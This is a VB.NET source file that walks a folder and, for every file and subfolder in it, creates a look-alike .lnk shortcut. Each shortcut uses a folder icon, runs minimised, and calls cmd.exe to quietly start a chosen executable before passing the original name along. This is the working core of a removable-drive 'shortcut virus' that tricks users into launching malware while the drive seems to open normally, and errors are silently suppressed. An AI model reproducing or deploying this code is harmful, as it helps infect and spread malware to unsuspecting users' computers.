﻿Imports System
Imports System.IO
Namespace Shortcut
    Public Class Shortcut

        Public Shared Sub shortcut(ByVal mypath As String, ByVal appfullname As String)
            For Each path As String In GetallfilefolderList(mypath)
                'Console.WriteLine(path)
                If (IO.File.Exists(path) And GetFilenameWithExtension(path) <> appfullname) Then
                    Dim name As String = GetFilenameWithoutExtension(path)
                    Dim dir As String = GetDirectoryFromPathFilename(path)
                    Dim relpath As String = GetFilenameWithExtension(path)
                    'Console.WriteLine(name)
                    'Console.WriteLine(dir)
                    makeshorcuts(relpath, dir, name, appfullname)
                ElseIf (IO.Directory.Exists(path) And GetFilenameWithExtension(path) <> appfullname) Then
                    Dim name As String = GetFilenameWithExtension(path)
                    Dim dir As String = GetDirectoryFromPathFilename(path)
                    makeshorcuts(name, dir, name, appfullname)
                    'Console.WriteLine(name)
                    'Console.WriteLine(dir)
                End If
            Next
            'Console.Read()


        End Sub

        'Makeshortcuts func
        Public Shared Function makeshorcuts(TargetName As String, ShortCutPath As String, ShortCutName As String, appfullpath As String) As Boolean
            Dim oShell As Object
            Dim oLink As Object
            '"%windir%\system32\cmd.exe " /q/c start \ConsoleApplication1.exe %CD%Hello
            '%windir%\system32\cmd.exe " /q/c start \ConsoleApplication1.exe %CD%Hello
            '%windir%\system32\cmd.exe " /q/c start \$safeprojectname$.exe %CD%System Volume Information
            Try
                oShell = CreateObject("WScript.Shell")
                oLink = oShell.CreateShortcut(ShortCutPath & "\" & ShortCutName & ".lnk")

                oLink.TargetPath = "%windir%\system32\cmd.exe"
                oLink.Arguments = "/q/c start \" & appfullpath & " %CD%" & TargetName
                oLink.WorkingDirectory = "%CD%"
                oLink.IconLocation = "%SystemRoot%\system32\SHELL32.dll, 4"
                oLink.WindowStyle = 7
                oLink.Save()
            Catch ex As Exception
                'Console.Write(ex)
            End Try
            Return True

        End Function

        ' GetFilenameWithoutExtension:  Return filename without extension from complete path
        Public Shared Function GetFilenameWithoutExtension(path As String) As String
            Dim pos As Integer
            Dim filename As String
            pos = InStrRev(path, "\")
            If pos > 0 Then
                filename = Mid$(path, pos + 1, Len(path))
                GetFilenameWithoutExtension = Left(filename, Len(filename) - Len(Mid$(filename, InStrRev(filename, "."), Len(filename))))
            Else
                GetFilenameWithoutExtension = ""
            End If
        End Function

        ' GetFilenameWithExtension: Return filename with extension from complete path
        Public Shared Function GetFilenameWithExtension(path As String) As String
            Dim pos As Integer
            pos = InStrRev(path, "\")
            If pos > 0 Then
                GetFilenameWithExtension = Mid$(path, pos + 1, Len(path))
            Else
                GetFilenameWithExtension = ""
            End If
        End Function


        ' GetDirectoryFromPathFilename: Return directory path contain filename
        Public Shared Function GetDirectoryFromPathFilename(path As String) As String
            Dim pos As Integer
            pos = InStrRev(path, "\")
            If pos > 0 Then
                GetDirectoryFromPathFilename = Left$(path, pos)
            Else
                GetDirectoryFromPathFilename = ""
            End If
        End Function

        Public Shared Function GetallfilefolderList(path As String) As ArrayList
            Dim Pathlist As New ArrayList
            On Error Resume Next

            For Each foundFile As String In My.Computer.FileSystem.GetFiles(path)
                Pathlist.Add(foundFile)
            Next

            For Each foundFile As String In My.Computer.FileSystem.GetDirectories(path)
                Pathlist.Add(foundFile)
            Next



            GetallfilefolderList = Pathlist
        End Function

    End Class

End Namespace

